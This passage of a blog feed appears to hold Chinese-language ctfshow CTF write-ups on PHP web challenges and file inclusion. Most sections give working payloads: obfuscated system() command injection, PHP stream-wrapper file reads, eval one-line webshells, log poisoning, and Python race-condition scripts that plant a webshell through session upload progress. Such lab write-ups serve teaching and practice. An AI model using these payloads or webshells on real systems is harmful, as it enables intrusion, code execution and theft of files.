如果传入<code>?a=flag</code>, 那么 <code>$key=a``$value=flag</code>, 那么在进行 <code>$$key = $$value</code>语句时，即<code> $a = $flag</code></p>\n<p>那么flag值就传入了变量 a 中</p>\n<p>而对于第二个处理POST的<code>foreach()</code>也是一样的</p>\n<p>重要的是在之后的if判断语句，当POST传入的flag不等于原来的flag值时，将会输出error的值，而对于想要获取flag的我们来说，flag是未知的，也就是说这句判断一定为true，之后的语句一定会进入，即输出error的值</p>\n<p>由此，根据一开始的分析，我们可以设法使error的值变为flag的值</p>\n<p>对于post操作，由于对内容进行了判断，因此不能使用post进行把flag赋值到error的操作，因此只能通过get操作</p>\n<p>而通过对GET段代码判断，发现只过滤了error值，因此可以把flag赋值到某一变量中</p>\n<p>即对get，<code>?变量名=flag</code></p>\n<p>之后的post，需要将flag值赋值到error中，因此对POST<code>error=变量名</code></p>\n<p>而之后对POST flag的判断，由于一定为true，故输出error值，即flag</p>\n<h1 id=\"web-106\"><a href=\"#web-106\" class=\"headerlink\" title=\"web 106\"></a>web 106</h1><p>对于104的源代码增添了对传入值的相等判断，那么使用数组绕过 </p>\n<h1 id=\"web-107\"><a href=\"#web-107\" class=\"headerlink\" title=\"web 107\"></a>web 107</h1><p><code>parse_str(string $string , array &amp;$result ): void</code></p>\n<p>如果string是URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了result则会设置到该数组里）。</p>\n<p>再由代码，只需传入包含flag赋值的<code>v1</code>，和<code>MD5($v3)</code> 为传入的flag值</p>\n<p>payload</p>\n<pre><code class=\"php\">?v3=1\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n</code></pre>\n<h1 id=\"web-108\"><a href=\"#web-108\" class=\"headerlink\" title=\"web 108\"></a>web 108</h1><p>截断绕过</p>\n<p><code>?c=a%00778</code></p>\n<h1 id=\"web-109\"><a href=\"#web-109\" class=\"headerlink\" title=\"web 109\"></a>web 109</h1><p>关键在于<code>eval(\"echo new $v1($v2());\");</code></p>\n<h2 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>这里需要补充知识</p>\n<ol>\n<li><p>如果一个变量的后面跟上 ()，那么会将值作为函数进行调用</p>\n<p>如 <code>$a = 'phpinfo';$a();</code></p>\n<p>相当于进行了<code>phpinfo();</code></p>\n</li>\n<li><p>类于对象魔术方法</p>\n<p>下列方法名被认为是魔术方法： __construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 <strong>debugInfo() 。</strong></p>\n<p>__而__toString ()方法用于一个类被当成字符串时应怎样回应。例如<code>echo $obj;</code>应该显示些什么。</p>\n<p>如以下代码</p>\n<pre><code class=\"php\">class test\n{\n    public $a = 'test';\n    public function te()\n    {\n        return $this-&gt;a;\n    }\n    public function __toString()\n    {\n        return $this-&gt;a;\n    }\n}\necho new test();\n</code></pre>\n<p>将会输出 test</p>\n<p>这样可以采取该方法<code>?v1=mysqli&amp;v2=system('ls')</code>列出目录，之后<code>?v1=mysqli&amp;v2=system('tac flag.php')</code>读取文件</p>\n<p>或者可将<code>mysqli</code>换成<code>exception</code>类，<code>exception()</code>，括号中的参数会将其作为php代码执行(存疑，并不是这样)，不过滤</p>\n<p>因此<code>?v1=exception&amp;v2=system('tac flag.php')</code>也可</p>\n</li>\n</ol>\n<h2 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>将<code>v1</code>改为<code>reflectionclass</code></p>\n<p>实际上，经过尝试，对于大多数类都能这样</p>\n<p>但触发了<code>echo new test(phpinfo());</code>后，在之后的代码都不会执行 ==(具体原理不清楚)==</p>\n<p>大多数能够输出的原因 (猜测)：</p>\n<p>如果用 echo 输出一个类对象，那么输出结果由<code> __toString()</code>控制，而在高版本中，<code>__toString</code>自动存在，其内容为<code>print $value;</code>, 同时也可自己控制</p>\n<h1 id=\"web-110\"><a href=\"#web-110\" class=\"headerlink\" title=\"web 110\"></a>web 110</h1><p>过滤了各种字符，采用<code>FilesystemIterator</code>，参数写<code>getcwd</code>，<code>getcwd</code>用来取得当前工作目录， 两个连用后返回第一个名字</p>\n<h1 id=\"web-111\"><a href=\"#web-111\" class=\"headerlink\" title=\"web 111\"></a>web 111</h1><p>采用超全局变量GLOBALS，获取全局作用域下的可用的全部变量</p>\n<h1 id=\"web-112\"><a href=\"#web-112\" class=\"headerlink\" title=\"web 112\"></a>web 112</h1><pre><code class=\"php\">?file=php://filter/resource=flag.php\n?file=php://filter/convert.base32-encode/resource=flag.php// 当然 base32 等其他的 base 系列都是可以的，或者其他的编码形式\n?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php\n?file=compress.zlib://flag.php\n?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php\n</code></pre>\n<h1 id=\"web-113\"><a href=\"#web-113\" class=\"headerlink\" title=\"web 113\"></a>web 113</h1><p><code>is_file()</code>也支持一些包装器和伪协议，返回的值为 false</p>\n<h2 id=\"解法一-1\"><a href=\"#解法一-1\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>过滤器被过滤，使用压缩流<code>?file=compress.zlib://flag.php</code></p>\n<h2 id=\"解法二-1\"><a href=\"#解法二-1\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>linux 里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容多次重复后绕过<code>is_file</code></p>\n<p>使用脚本跑，得到 payload</p>\n<h1 id=\"web-114\"><a href=\"#web-114\" class=\"headerlink\" title=\"web 114\"></a>web 114</h1><p>filter</p>\n<h1 id=\"web-115\"><a href=\"#web-115\" class=\"headerlink\" title=\"web 115\"></a>web 115</h1><pre><code class=\"php\">&lt;?php\nfor ($i = 1; $i &lt;= 128; $i = $i + 1) {\n    $temp = chr($i) . '1';\n    if (is_numeric($temp) &amp;&amp; trim($temp) !== '1') {\n        echo urlencode($temp), PHP_EOL;\n    }\n}\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">%0C1\n%2B1\n-1\n.1\n01\n11\n21\n31\n41\n51\n61\n71\n81\n91\n</code></pre>\n<p>对比过滤的符号，发现只有<code>%0c</code>可以用 </p>\n<p>payload:<code>?num=%0c36</code></p>\n<h1 id=\"web-117\"><a href=\"#web-117\" class=\"headerlink\" title=\"web 117\"></a>web 117</h1><p>主要是要通过这些判断语句</p>\n<p><code>is_numeric($num)</code></p>\n<p><code>$num !== '36'</code></p>\n<p><code>trim($num) !== '36'</code></p>\n<p><code>filter($num) == '36') $num == '36'</code></p>\n<p><code>is_numeric()</code>用于判断<code>num</code>是否为一个数字，在数字前面加上如<code>%20</code>的空格，那么仍为<code>true</code>，如果在后面加，那么为<code>false</code></p>\n<p>第二句为不全等于，如果加了空格，因为比较的是字符串的内容，所以一定能通过</p>\n<p>第三句为<code>trim()</code>函数的应用</p>\n<pre><code class=\"php\">此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： \n◦ \" \" (ASCII 32 (0x20))，普通空格符。  \n◦ \"\\t\" (ASCII 9 (0x09))，制表符。  \n◦ \"\\n\" (ASCII 10 (0x0A))，换行符。  \n◦ \"\\r\" (ASCII 13 (0x0D))，回车符。  \n◦ \"\\0\" (ASCII 0 (0x00))，空字节符。  \n◦ \"\\x0B\" (ASCII 11 (0x0B))，垂直制表符。\n</code></pre>\n<p>`</p>\n<p><code>%0c</code>也还是可以使用，因此可以输入<code>%0c36</code>绕过</p>\n<p>第四句为函数`filter的通过，观察代码，上述能通过</p>\n<p>第五句为弱等于，由于比较的内容中有数字，因此两边都转换为数字，经过本地测试，<code>%0c36</code>转换成了数字36，因此也能通过判断</p>\n<p>所以payload:<code>?num=%0c36</code></p>\n<h1 id=\"web-123\"><a href=\"#web-123\" class=\"headerlink\" title=\"web 123\"></a>web 123</h1><p>对于该题，看到需要<code>POST CT_SHOW</code>和<code>CTF_SHOW.COM</code>的值</p>\n<p>由于PHP变量只能由数字字母下划线，故如果直接上传<code>CTF_SHOW.COM</code>后，<code>.</code>会自动转换成下划线，上传的实际上是<code>CTF_SHOW_COM</code>的变量</p>\n<p>而为了防止对后面的点进行转换，可以将<code>CTF</code>后的下划线改为左方括号，这样，只会将该括号改为下划线，而后面的点不受影响，但是如果将其换为<code>.</code>或<code>+</code>，两个符号均会变成下划线</p>\n<p>再看代码，之后会进行<code>eval</code>函数， <code>$c</code> 为POST传入的<code>$fun</code>值</p>\n<h2 id=\"解法一-2\"><a href=\"#解法一-2\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>传入命令<code>extract($_POST)</code>将变量转为POST类型，然后通过POST传入<code>fl0g=flag_give_me</code>绕过对GET变量的判断，并且满足第二个判断条件</p>\n<p>payload: <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</code></p>\n<h2 id=\"解法二-2\"><a href=\"#解法二-2\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p><code>get_defined_vars</code> —— 返回由所有已定义变量所组成的数组</p>\n<p>由于返回的是数组，<code>echo</code>输出数组只能输出<code>Array</code>，因此需要一个输出数组的函数或者将数组转换为字符串</p>\n<p>但输出数组的函数<code>var_dump()</code>,<code>print_r()</code>被禁用，故尝试使数组转换为字符串</p>\n<ul>\n<li><p>implode</p>\n<p>implode —— 将一个一维数组的值转化为字符串</p>\n<p>payload:<code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo implode(get_defined_vars())</code></p>\n</li>\n</ul>\n<h2 id=\"解法三\"><a href=\"#解法三\" class=\"headerlink\" title=\"解法三\"></a>解法三</h2><p>利用<code>argv</code>数组</p>\n<p>数组中，用空格来进行值的分别</p>\n<p>GET:<code>?a=1+fl0g=flag_give_me</code></p>\n<p>POST:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></p>\n<h2 id=\"解法四\"><a href=\"#解法四\" class=\"headerlink\" title=\"解法四\"></a>解法四</h2><p>GET:<code>1=flag.php</code></p>\n<p>POST:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code></p>\n<h2 id=\"解法五\"><a href=\"#解法五\" class=\"headerlink\" title=\"解法五\"></a>解法五</h2><p><code>var_dump($GLOBALS)</code></p>\n<h1 id=\"web-125\"><a href=\"#web-125\" class=\"headerlink\" title=\"web 125\"></a>web 125</h1><p>过滤了<code>flag|GLOBALS|echo|var_dump|print</code></p>\n<p>仍可使用上面的法1、法3、法4</p>\n<h1 id=\"web-126\"><a href=\"#web-126\" class=\"headerlink\" title=\"web 126\"></a>web 126</h1><p>使用法三</p>\n<h1 id=\"web-127\"><a href=\"#web-127\" class=\"headerlink\" title=\"web 127\"></a>web 127</h1><p>用空格绕过 <code>_</code></p>\n<p><code>?ctf show=ilove36d</code></p>\n<p><code>$_SERVER [QUERY_STRING]</code>，经过验证，不能显示post传参的内容，故只能采取get传参</p>\n<h1 id=\"web-128\"><a href=\"#web-128\" class=\"headerlink\" title=\"web 128\"></a>web 128</h1><p>主要使用<code>gettext</code>函数</p>\n<p>获取当前信息，可以获取到参数中的值，而它又可以使用<code>_</code>代替该函数</p>\n<p>所以 payload:<code>?f1=_&amp;f2=get_defined_vars</code></p>\n<h1 id=\"web-129\"><a href=\"#web-129\" class=\"headerlink\" title=\"web 129\"></a>web 129</h1><p>目录穿越</p>\n<p><code>../ctfshow/../html/flag.php</code> （或其他)</p>\n<h1 id=\"web-130\"><a href=\"#web-130\" class=\"headerlink\" title=\"web 130\"></a>web 130</h1><p><code>f=ctfshow</code></p>\n<p>或数组绕过</p>\n<p><code>f[]=1</code></p>\n<h1 id=\"web-131\"><a href=\"#web-131\" class=\"headerlink\" title=\"web 131\"></a>web 131</h1><p><code>$a = str_repeat(\"show\",250000); $b = $a . \"36Dctfshow\"; echo $b;</code></p>\n<p>长度限制，绕过正则</p>\n<h1 id=\"web-132\"><a href=\"#web-132\" class=\"headerlink\" title=\"web 132\"></a>web 132</h1><p>逻辑运算符的优先级判断</p>\n<p>payload:<code>?username=admin&amp;password=1&amp;code=adm3in</code></p>\n<h1 id=\"web-133\"><a href=\"#web-133\" class=\"headerlink\" title=\"web 133\"></a>web 133</h1><h2 id=\"curl-外带\"><a href=\"#curl-外带\" class=\"headerlink\" title=\"curl 外带\"></a>curl 外带</h2><p>curl</p>\n<h2 id=\"Linux-中的-cp-命令\"><a href=\"#Linux-中的-cp-命令\" class=\"headerlink\" title=\"Linux 中的 cp 命令\"></a>Linux 中的 cp 命令</h2><p>利用<code>cp</code>命令将flag.php写入1.txt，然后访问1.txt</p>\n<pre><code class=\"raw\">payload：\n?F=`$F` ;cp flag.php 1234.txt\n/1234.txt\n</code></pre>\n<p>注意是反引号，相当于shell_exec()函数</p>\n<p>成功原因</p>\n<p>虽然<code>substr</code>只取前六位，但在该payload中，由于前六位是</p>\n<pre><code class=\"raw\">`$F` ;\n</code></pre>\n<p>读入后变量的值会放进去变成</p>\n<pre><code class=\"raw\">``$F` ;cp flag.php 1234.txt`\n</code></pre>\n<h2 id=\"PING\"><a href=\"#PING\" class=\"headerlink\" title=\"PING\"></a>PING</h2><h1 id=\"web-134\"><a href=\"#web-134\" class=\"headerlink\" title=\"web 134\"></a>web 134</h1><p>观察代码</p>\n<p><code>parse_str</code> — 将字符串解析成多个变量</p>\n<p><code>extract</code> — 从数组中将变量导入到当前的符号表 (如果变量已存在，将会覆盖变量)</p>\n<p>由于不能在POST里直接传<code>key1</code>和<code>key2</code>的值，所以可以通过GET方式，传入变量名为<code>_POST</code>的变量，使得其在之后的<code>extract</code>能够覆盖原理啊的<code>key1</code>和<code>key2</code></p>\n<p>payload:<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>\n<h1 id=\"web-135\"><a href=\"#web-135\" class=\"headerlink\" title=\"web 135\"></a>web 135</h1><h2 id=\"cp-命令\"><a href=\"#cp-命令\" class=\"headerlink\" title=\"cp 命令\"></a>cp 命令</h2><h2 id=\"ping\"><a href=\"#ping\" class=\"headerlink\" title=\"ping\"></a>ping</h2><h2 id=\"web-136\"><a href=\"#web-136\" class=\"headerlink\" title=\"web 136\"></a>web 136</h2><h2 id=\"tee-命令\"><a href=\"#tee-命令\" class=\"headerlink\" title=\"tee 命令\"></a>tee 命令</h2><p><code>?c=ls /|tee 1</code></p>\n<p>将<code>ls /</code>的回显写入1文件</p>\n<p>使用nl命令</p>\n<p>之后可以使用同样命令，然后返回即可</p>\n<h2 id=\"修改文件内容\"><a href=\"#修改文件内容\" class=\"headerlink\" title=\"修改文件内容\"></a>修改文件内容</h2><p><code>?c=ls |xargs sed -i 's/exec/echo/'</code></p>\n<p><code>?c=ls |xargs sed -i 's/exec/system/'</code></p>\n<p>重新访问题目，可以发现字符串匹配下<code>die</code>变为<code>echo</code>，也就是说，即使满足正则匹配，代码不会结束，会执行后面的代码</p>\n<p>无回显的<code>exec</code>变为了<code>system</code>，可以输入命令并回显</p>\n<h1 id=\"web-137\"><a href=\"#web-137\" class=\"headerlink\" title=\"web 137\"></a>web 137</h1><p>类静态方法的访问</p>\n<p>POST: <code>ctfshow=ctfshow::getFLag</code></p>\n<h1 id=\"web-138\"><a href=\"#web-138\" class=\"headerlink\" title=\"web 138\"></a>web 138</h1><p>ban掉了冒号</p>\n<p>查看文档，找寻访问静态方法的另一种手段</p>\n<p><code>call_user_func</code></p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/static_visit.png\"></p>\n<p>也就是说可以通过给<code>call_user_func</code>传入一个数组，使其访问</p>\n<p>所以payload:<code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code>（该语句意义为给 ctfshow [] 赋两个值）</p>\n<h1 id=\"web-139\"><a href=\"#web-139\" class=\"headerlink\" title=\"web 139\"></a>web 139</h1><p>经过测试，如果想要<code>intval($code) == 'ctfshow'</code>为 true</p>\n<p>那么<code>code</code>也应该为字符串</p>\n<p>而<code>$code = eval(\"return $f1($f2());\");</code></p>\n<p>所以必须要使函数返回字符串，</p>\n<pre><code class=\"php\">f1=system&amp;f2=getcwd\nf1=system&amp;f2=system\n</code></pre>\n<h1 id=\"web-141\"><a href=\"#web-141\" class=\"headerlink\" title=\"web 141\"></a>web 141</h1><pre><code class=\"php\">if (is_numeric($v1) &amp;&amp; is_numeric($v2)) {\n        if (preg_match('/^\\W+$/', $v3)) {\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \" . $code;\n        }\n    }\n</code></pre>\n<p>由判断及正则匹配，知v1，v2为数字，v3为非字母</p>\n<p>测试</p>\n<pre><code class=\"php\">$test = $_GET['test'];\neval(\"$test;\");\n?test=phpinfo()\n</code></pre>\n<p><code>phpinfo()</code> 被成功执行，也就是说该写法成立 (相当于以前的`eval ($c));?c=phpinfo())</p>\n<p>在上面的语句中，分号已写不用自己补，因此会执行该代码</p>\n<p>而由于题目执行的代码是<code>$v1$v3$v2</code>,<code>v1</code>，<code>v2</code>必为数字，所以可控的字符只有<code>v3</code>，并要将其于前后分开</p>\n<p>进行测试</p>\n<pre><code class=\"php\">1-phpinfo()-1\n</code></pre>\n<p>可以执行，所以可以传入<code>?v1=1&amp;v2=1&amp;v3=</code>命令进行</p>\n<p>但又因<code>3</code>不能出现字母，而大多数函数都有字母，这里采用<code>16</code>进制构造的方法构造出命令</p>\n<p>例如</p>\n<pre><code class=\"php\">//system('ls')\n?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80^%ec%f3)-   \n//system('tac flag.php')\n?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)-\n</code></pre>\n<h1 id=\"web-142\"><a href=\"#web-142\" class=\"headerlink\" title=\"web 142\"></a>web 142</h1><p>输入小于等于0的数字即可</p>\n<h1 id=\"web-143\"><a href=\"#web-143\" class=\"headerlink\" title=\"web 143\"></a>web 143</h1><p>同141，把减号换成乘号</p>\n<h1 id=\"web-144\"><a href=\"#web-144\" class=\"headerlink\" title=\"web 144\"></a>web 144</h1><p>原理同141, 调整一下v2，v3</p>\n<pre><code class=\"php\">?v1=1&amp;v2=(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)&amp;v3=-\n</code></pre>\n<h1 id=\"web-145\"><a href=\"#web-145\" class=\"headerlink\" title=\"web 145\"></a>web 145</h1><p>相同原理</p>\n<p>这里使用取反运算 (或运算不能用，应为如果要用或，那么值一定在0-128内，而此时因为绝大部分可用字符被禁，也就是说此时不能构造出满足条件的)</p>\n<p>并使用三元条目运算符 <code>?ex1:ex2</code></p>\n<p><code>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):</code></p>\n<p>或者用没有过滤的或运算</p>\n<p><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</code></p>\n<h1 id=\"web-146\"><a href=\"#web-146\" class=\"headerlink\" title=\"web 146\"></a>web 146</h1><p>同145第二种解法</p>\n<h1 id=\"web-147\"><a href=\"#web-147\" class=\"headerlink\" title=\"web 147\"></a>web 147</h1><p><code>if (!preg_match('/^[a-z0-9_]*$/isD', $ctfshow))</code></p>\n<p>不能有数字字母开头</p>\n<p>利用命名空间<code>\\函数名</code></p>\n<p>首先使用<code>\\phpinfo</code>, 发现提示用了2个函数</p>\n<p>这里可以采用匿名函数，然后传入<code>show</code>使其闭合<code>if</code>判断，最后注释后面的语句</p>\n<p>payload:</p>\n<pre><code class=\"php\">?show=}system('tac flag.php');/*\nctf=\\create_function\n</code></pre>\n<h1 id=\"web-148\"><a href=\"#web-148\" class=\"headerlink\" title=\"web 148\"></a>web 148</h1><p>同 141</p>\n<p><strong>或者</strong></p>\n<p>调用函数方法</p>\n<pre><code class=\"php\">get_ctfshow_fl0g()\n?code = (%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80^%e7%e5%f4%df%e3%f4%e6%f3%e8%ef%f7%df%e6%ec%b0%e7)();\n</code></pre>\n<h1 id=\"web-149\"><a href=\"#web-149\" class=\"headerlink\" title=\"web 149\"></a>web 149</h1><p>覆盖index.php</p>\n<p>payload：</p>\n<pre><code class=\"php\">?ctf=index.php \nPOST:show=&lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<h1 id=\"web-150\"><a href=\"#web-150\" class=\"headerlink\" title=\"web 150\"></a>web 150</h1><p>日志包含</p>\n<pre><code class=\"php\">&lt;?php eval($_REQUEST[1]);?&gt;\n</code></pre>\n<p>然后利用ctf传参，传入日志的路径，使日志被访问</p>\n<pre><code class=\"raw\">ctf=/var/log/nginx/access.log\n</code></pre>\n<p>设置isVIP的值为1，使最下面的if条件成立</p>\n<pre><code class=\"raw\">?isVIP=1\n</code></pre>\n<h1 id=\"web-150-plus\"><a href=\"#web-150-plus\" class=\"headerlink\" title=\"web 150-plus\"></a>web 150-plus</h1><p><code>__autoload()</code><br>当第一次使用一个类 A 时，如果找不到，会自动调用<code>__autoload()</code>方法，并将类名<code>A</code>作为参数传入，我们在<code>__autoload()</code>中需要的做的就是根据类名，找到相应的文件，并包含进来。</p>\n<p>本题中<code>class_exists()</code>类是第一次使用，可以通过对它的使用来调用 <code>autoload ()</code>这个魔术方法输出变量<code>$class</code></p>\n<p>过滤掉了<code>_</code>，可以通过<code>…</code>绕过</p>\n<p>因为题中有<code>extract</code>函数，会将传入的数组解析掉，所以get传入：<code>?..CTFSHOW…=phpinfo</code></p>\n<p><code>phpinfo()</code> 里面有flag</p>\n<p>预期解：<strong>条件竞争</strong></p>\n<p><code>ctf=1.php</code></p>\n<p><code>show=&lt;?php system('tac /c*');?&gt;</code></p>\n<p>使用bp不断访问并传参，然后开一个去不断访问1.php</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/31915a1e/",
            "url": "http://dpm12345.cn/posts/31915a1e/",
            "title": "文件包含",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-78\"><a href=\"#web-78\" class=\"headerlink\" title=\"web 78\"></a>web 78</h1><p>php 伪协议</p>\n<h1 id=\"web-79\"><a href=\"#web-79\" class=\"headerlink\" title=\"web 79\"></a>web 79</h1><p>data伪协议<code>data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-80\"><a href=\"#web-80\" class=\"headerlink\" title=\"web 80\"></a>web 80</h1><p>data 协议被禁用</p>\n<p>可以尝试日志包含</p>\n<p><code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-82\"><a href=\"#web-82\" class=\"headerlink\" title=\"web 82\"></a>web 82</h1><pre><code class=\"python\">#coding=utf-8\nimport io\nimport requests\nimport threading\nsessid = 'TGAO'          #sessionid 值，也为控制的文件名\ndata = {\"cmd\":\"system('whoami');\"}         #进行的命令\n\n# 写文件\ndef write(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)      #写入的文件内容\n        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )\n        #'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval ($_POST [\"cmd\"]);?&gt;' 为一句话木马\n        # files={'file': ('tgao.txt',f)} 为上传的文件\n        # cookies={'PHPSESSID': sessid}，设置 sessid，控制文件名\n        \n# 读文件\ndef read(session):\n    while True:\n        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)\n        if 'tgao.txt' in resp.text:\n            print(resp.text)\n            event.clear()\n        else:\n            print(\"[+++++++++++++]retry\")\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in xrange(1,30): \n            threading.Thread(target=write,args=(session,)).start()\n        for i in xrange(1,30):\n            threading.Thread(target=read,args=(session,)).start()\n    event.set()\n</code></pre>\n<pre><code class=\"python\">import requests\nimport io\nimport threading\nurl = ' http://4c773cea-91fa-498e-8027-46bab5889b16.challenge.ctf.show:8080/'\nsessionid = 'ctfshow'\ndata = {\n    \"1\": \"file_put_contents( '/var/www/html/2.php','&lt;?php eval($_ POST[2]);?&gt;');\"\n}\n\n\ndef write(session):\n    fileBytes = io.BytesI0(b' a'*1024*50)\n    while True:\n        response = session.post(url,\n                                data={\n                                    ' PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_ POST[1]);?&gt;'\n                                },\n                                cookies={\n                                    ' PHPSESSID': sessionid\n                                },\n                                files={\n                                    'file': ('ctfshow.jpg ', fileBytes)\n                                }\n                                )\n\n\ndef read(session):\n    while True:\n        response = session.post(url + '?file=/tmp/sess_' + sessionid, data=data,\n                                cookies={\n                                    'PHPSESSID': sessionid\n                                }\n                                )\n        resposne2 = session.get(url + '2.php ')\n        if resposne2.status_code == 200:\n            print('++++++done++++++')\n        else:\n            print(resposne2.status_code)\n\n\nif __name__ == '__main__':\n    evnet = threading . Event()\n    with requests.session() as session:\n        for i in range(5):\n            threading. Thread(target=write, args=(session,)).start()\n        for i in range(5):\n            threading. Thread(target=read, args=(session,)) .start()\nevnet. set()\n</code></pre>\n<h1 id=\"web-83-x2F-84\"><a href=\"#web-83-x2F-84\" class=\"headerlink\" title=\"web 83 /84\"></a>web 83 /84</h1><p>83使用了</p>\n<pre><code class=\"php\">session_unset();\nsession_destroy;\n</code></pre>\n<p>84使用了</p>\n<pre><code class=\"php\">system(\"rm -rf /tmp/*\");\n</code></pre>\n<p>但都可以用82脚本跑出，第一个为脚本中session的设置，第二个为线程的作用，刚删但刚写</p>\n<h1 id=\"web-85\"><a href=\"#web-85\" class=\"headerlink\" title=\"web 85\"></a>web 85</h1><p>虽然有对内容”&lt;”的判断，但还是可以通过上面代码进行，增加线程即可</p>\n<h1 id=\"web-87\"><a href=\"#web-87\" class=\"headerlink\" title=\"web 87\"></a>web 87</h1><p>改为写文件了，可以使用过滤器</p>\n<pre><code class=\"php\">php://filter/write=string.rot13/resource=2.php\n</code></pre>\n<p>因为是对file的解码，因此对file的内容进行两次url编码，上传后，访问2.php文件即可</p>\n<h1 id=\"web-88\"><a href=\"#web-88\" class=\"headerlink\" title=\"web 88\"></a>web 88</h1><p>data 协议，base64 编码，构造出不带 =，+ 号的编码</p>\n<p><code>data://text/plain;base64,&lt;?php system('ls');?&gt;</code></p>\n<h1 id=\"web-117\"><a href=\"#web-117\" class=\"headerlink\" title=\"web 117\"></a>web 117</h1><p>伪协议，过滤器，死亡绕过</p>\n<p>通过转码使得院死亡代码无效，使自己的代码有效</p>\n<pre><code class=\"php\">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b013ba57/",
            "url": "http://dpm12345.cn/posts/b013ba57/",
            "title": "信息收集 爆破 命令执行",
            "date_published": "2022-10-04T14:11:40.000Z",
            "content_html": "<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><ol>\n<li>robots #</li>\n<li>域名解析 #</li>\n<li>.git<code>.svn</code>.swp </li>\n<li>editor 编辑器 如果访问一个不存在的目录，那么会列出根目录的所有文件 </li>\n<li>邮箱 qq 号泄漏部分信息 </li>\n<li>探针访问默认的 tz.php </li>\n<li>ip 访问，cdn 缓存清除 / 绕过，可加 www 绕过 </li>\n<li>Unicode 编码（可使用控制台输出) </li>\n<li>前端密码验证 可以绕过前端 js 直接 post 传入 </li>\n<li>access 数据库 db 目录下的 data.mdb db.mdb</li>\n<li></li>\n</ol>\n<h1 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h1><ol>\n<li>域名爆破子域名 <span class=\"exturl\" data-url=\"aHR0cDovL3BocGluZm8ubWUv\">phpinfo.me</span></li>\n<li>php_mt_seed</li>\n<li>\\uxx 可以用 consoleolog</li>\n<li></li>\n</ol>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><h2 id=\"Linux-中的-cp-命令\"><a href=\"#Linux-中的-cp-命令\" class=\"headerlink\" title=\"Linux 中的 cp 命令\"></a>Linux 中的 cp 命令</h2><p>利用cp命令将flag.php写入1.txt，然后访问1.txt</p>\n<p><code>system (\"cp fla?.php 1.txt\");</code>(对 flag 进行过滤)（mv 也行）</p>\n<h2 id=\"system-过滤可以使用反引号绕过，反引号作用相当于-system\"><a href=\"#system-过滤可以使用反引号绕过，反引号作用相当于-system\" class=\"headerlink\" title=\"system 过滤可以使用反引号绕过，反引号作用相当于 system\"></a>system 过滤可以使用反引号绕过，反引号作用相当于 system</h2><h2 id=\"嵌套-eval，主要用于过滤了相应查找的函数\"><a href=\"#嵌套-eval，主要用于过滤了相应查找的函数\" class=\"headerlink\" title=\"嵌套 eval，主要用于过滤了相应查找的函数\"></a>嵌套 